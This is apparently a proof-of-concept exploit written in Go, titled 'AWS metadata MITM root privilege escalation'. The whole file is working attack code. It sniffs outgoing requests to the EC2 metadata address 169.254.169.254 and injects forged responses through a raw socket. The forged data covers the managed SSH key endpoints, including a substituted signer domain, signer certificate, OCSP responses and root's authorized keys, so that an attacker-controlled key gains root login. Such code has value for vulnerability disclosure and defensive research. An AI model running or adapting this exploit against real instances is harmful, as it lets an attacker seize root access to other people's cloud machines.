/*
AWS metadata MITM root privilege escalation
Etienne Champetier (@champtar)
*/

package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO: make all the preparative work in Go instead of bash
var (
	intf    = flag.String("interface", "eth0", "the interface to listen on")
	metaIP  = flag.String("meta-ip", "169.254.169.254", "the IP of the metadata server")
	signer  = flag.String("signer-cert", "signer.pem", "the signer cert + intermediate in PEM format")
	domain  = flag.String("signer-domain", "champetier.net", "the domain that replace amazonaws.com")
	ocspdir = flag.String("ocsp-dir", "ocsp", "directory contaning ocsp responses")
	sshkeys = flag.String("sshkeys", "sshkeys", "the sshkeys response, already signed")
)

func main() {
	log.SetFlags(log.Lshortfile)
	flag.Parse()
	defer log.Println("Bye")

	if *domain == "" {
		log.Fatal("--domain is empty")
	}

	httpRespFmt := "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"

	signerData := readAll(*signer)
	sshkeysData := readAll(*sshkeys)

	responses := map[string]gopacket.Payload{
		"GET /latest/meta-data/services/domain/ HTTP/1.1": gopacket.Payload(
			[]byte(fmt.Sprintf(httpRespFmt, len(*domain), *domain))),
		"GET /latest/meta-data/managed-ssh-keys/signer-cert/ HTTP/1.1": gopacket.Payload(
			[]byte(fmt.Sprintf(httpRespFmt, len(signerData), signerData))),
		"HEAD /latest/meta-data/managed-ssh-keys/active-keys/root/ HTTP/1.1": gopacket.Payload(
			[]byte(fmt.Sprintf(httpRespFmt, len(sshkeysData), ""))),
		"GET /latest/meta-data/managed-ssh-keys/active-keys/root/ HTTP/1.1": gopacket.Payload(
			[]byte(fmt.Sprintf(httpRespFmt, len(sshkeysData), sshkeysData))),
	}

	ocspReqFmt := "GET /latest/meta-data/managed-ssh-keys/signer-ocsp/%s HTTP/1.1"
	files, err := ioutil.ReadDir(*ocspdir)
	if err != nil {
		log.Fatal(err)
	}

	ocspList := ""
	for _, file := range files {
		ocspList += file.Name()
		ocspList += "\n"
		ocspData := readAll(*ocspdir + "/" + file.Name())

		responses[fmt.Sprintf(ocspReqFmt, file.Name())] = gopacket.Payload(
			[]byte(fmt.Sprintf(httpRespFmt, len(ocspData), ocspData)))
	}
	responses[fmt.Sprintf(ocspReqFmt, "")] = gopacket.Payload(
		[]byte(fmt.Sprintf(httpRespFmt, len(ocspList), ocspList)))

	pcapInactive, err := pcap.NewInactiveHandle(*intf)
	if err != nil {
		log.Fatal(err)
	}
	defer pcapInactive.CleanUp()
	if err := pcapInactive.SetImmediateMode(true); err != nil {
		log.Fatal(err)
	}
	if err := pcapInactive.SetSnapLen(1500); err != nil {
		log.Fatal(err)
	}
	if err := pcapInactive.SetPromisc(false); err != nil {
		log.Fatal(err)
	}
	pcapRX, err := pcapInactive.Activate()
	if err != nil {
		log.Fatal(err)
	}
	if err := pcapRX.SetDirection(pcap.DirectionOut); err != nil {
		log.Fatal(err)
	}
	// "greater 100" filter out empty tcp packets
	if err := pcapRX.SetBPFFilter("dst " + *metaIP + " and tcp dst port 80 and greater 100"); err != nil {
		log.Fatal(err)
	}

	// open RAW L3 socket to send responses.
	l3sock, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal(err)
	}
	if err := syscall.SetsockoptInt(l3sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		log.Fatal(err)
	}

	var reqETH layers.Ethernet
	var reqIP layers.IPv4
	var reqTCP layers.TCP
	var reqPayload gopacket.Payload

	respBuf := gopacket.NewSerializeBuffer()

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &reqETH, &reqIP, &reqTCP, &reqPayload)
	decoded := []gopacket.LayerType{}

	log.Println("Waiting for data ...")
	for {
		packetData, ci, err := pcapRX.ZeroCopyReadPacketData()
		t0 := ci.Timestamp
		t1 := time.Now()
		if err != nil {
			log.Println("Error getting packet:", err)
			continue
		}
		if err := parser.DecodeLayers(packetData, &decoded); err != nil {
			log.Println("Error decoding layers:", err)
			continue
		}

		req := string(reqPayload[:bytes.Index(reqPayload, []byte("\r\n"))])
		respPayload, ok := responses[req]
		if !ok {
			log.Println("Request not handled:", req)
			continue
		}

		respETH := layers.Ethernet{
			DstMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
			SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
			EthernetType: layers.EthernetTypeIPv4,
		}
		respIP := layers.IPv4{
			Version:  4,
			TTL:      64,
			SrcIP:    reqIP.DstIP,
			DstIP:    reqIP.SrcIP,
			Protocol: layers.IPProtocolTCP,
		}
		respTCP := layers.TCP{
			SrcPort: reqTCP.DstPort,
			DstPort: reqTCP.SrcPort,
			Seq:     reqTCP.Ack,
			Ack:     reqTCP.Seq + uint32(len(reqPayload.Payload())),
			Window:  reqTCP.Window,
			ACK:     true,
			PSH:     true,
		}
		respTCP.SetNetworkLayerForChecksum(&respIP)
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}
		err = gopacket.SerializeLayers(
			respBuf,
			opts,
			&respETH,
			&respIP,
			&respTCP,
			respPayload)
		if err != nil {
			log.Println("Error while serializing", err)
			continue
		}

		respBytes := respBuf.Bytes()
		addr := syscall.SockaddrInet4{
			Port: 0,
			Addr: [4]byte{reqIP.SrcIP[0], reqIP.SrcIP[1], reqIP.SrcIP[2], reqIP.SrcIP[3]},
		}
		if err := syscall.Sendto(l3sock, respBytes[14:], 0, &addr); err != nil {
			log.Println("Error Sendto:", err)
		}
		t2 := time.Now()
		log.Print("Request: '", req, "' time: ", t1.Sub(t0), " ", t2.Sub(t1), " total: ", t2.Sub(t0))
	}
}

func readAll(filename string) []byte {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatal(err)
	}
	return data
}
